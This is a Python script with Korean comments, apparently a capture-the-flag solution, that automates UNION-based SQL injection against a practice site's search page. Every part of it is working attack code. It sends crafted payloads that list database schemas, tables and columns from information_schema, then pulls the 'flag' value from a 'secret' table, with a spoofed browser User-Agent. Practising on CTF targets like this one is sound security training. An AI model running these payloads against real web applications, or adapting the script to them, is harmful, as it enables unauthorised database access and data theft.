import requests
from user_agent import generate_user_agent
from bs4 import BeautifulSoup

# 타겟 URL 설정
base_url = 'http://ctf2.segfaulthub.com:7777/sqli_5/search.php?search='

# 동적 User-Agent 설정
headers = {
    'User-Agent': generate_user_agent(os='win', device_type='desktop')
}

# 요청 파라미터 초기화
query_params = {
    'search': ''
}

# 데이터베이스 스키마 가져오기 함수
def fetch_schemas():
    for index in range(3):
        query_params['search'] = f"' UNION SELECT 1,2,3,4,5,table_schema FROM information_schema.tables LIMIT {index}, 1 #"
        response = requests.get(base_url, params=query_params, headers=headers)
        parsed_html = BeautifulSoup(response.text, "html.parser")
        
        try:
            schema_info = parsed_html.find_all("div", class_="widget-26-job-title")[7]
            schema_name = schema_info.find("a", recursive=False).text.strip()
            if schema_name:  # 공백이 아닐 경우에만 출력
                print(f"Schema {index}: {schema_name}")
        except IndexError:
            continue  # 오류 발생 시 무시

# 특정 데이터베이스의 테이블 이름 가져오기 함수
def fetch_tables(db_name):
    for index in range(4):
        query_params['search'] = f"' UNION SELECT 1,2,3,4,5,table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {index}, 1 #"
        response = requests.get(base_url, params=query_params, headers=headers)
        parsed_html = BeautifulSoup(response.text, "html.parser")
        
        try:
            table_info = parsed_html.find_all("div", class_="widget-26-job-title")[7]
            table_name = table_info.find("a", recursive=False).text.strip()
            if table_name:  # 공백이 아닐 경우에만 출력
                print(f"Table {index}: {table_name}")
        except IndexError:
            continue

# 특정 테이블의 컬럼 이름 가져오기 함수
def fetch_columns(table_name, db_name):
    for index in range(10):
        query_params['search'] = f"' UNION SELECT 1,2,3,4,5,column_name FROM information_schema.columns WHERE table_name='{table_name}' AND table_schema='{db_name}' LIMIT {index}, 1 #"
        response = requests.get(base_url, params=query_params, headers=headers)
        parsed_html = BeautifulSoup(response.text, "html.parser")
        
        try:
            column_info = parsed_html.find_all("div", class_="widget-26-job-title")[7]
            column_name = column_info.find("a", recursive=False).text.strip()
            if column_name:  # 공백이 아닐 경우에만 출력
                print(f"Column {index}: {column_name}")
        except IndexError:
            continue

# 특정 테이블의 특정 컬럼에서 데이터 가져오기 함수
def fetch_data_from_column(column_name, table_name, db_name):
    for index in range(10):
        query_params['search'] = f"' UNION SELECT 1,2,3,4,5,{column_name} FROM {db_name}.{table_name} LIMIT {index}, 1 #"
        response = requests.get(base_url, params=query_params, headers=headers)
        parsed_html = BeautifulSoup(response.text, "html.parser")
        
        try:
            data_info = parsed_html.find_all("div", class_="widget-26-job-title")[7]
            data_value = data_info.find("a", recursive=False).text.strip()
            if data_value:  # 공백이 아닐 경우에만 출력
                print(f"Data {index}: {data_value}")
        except IndexError:
            continue

# 메인 실행 흐름
if __name__ == "__main__":
    fetch_schemas()
    print()

    database_name = "sqli_5"
    fetch_tables(database_name)
    print()

    target_table = "secret"
    fetch_columns(target_table, database_name)
    print()

    target_column = "flag"
    fetch_data_from_column(target_column, target_table, database_name)